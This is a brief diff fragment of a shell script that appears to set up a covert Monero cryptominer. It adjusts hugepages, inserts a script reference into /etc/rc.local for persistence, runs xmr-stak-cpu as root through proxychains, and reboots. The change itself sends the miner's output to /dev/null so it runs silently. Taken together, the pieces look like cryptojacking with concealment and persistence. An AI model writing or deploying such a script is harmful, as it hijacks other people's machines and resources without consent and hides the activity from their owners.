@@ -23,7 +23,7 @@ then
   sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
   sudo sed -i -e "/m/test01/ax.sh" /etc/rc.local
   cd /m/test01/xmr
-  sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu
+  sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
   sudo reboot   
 else
   sudo /bin/su -c "echo 'xxxxx' >> /$file"
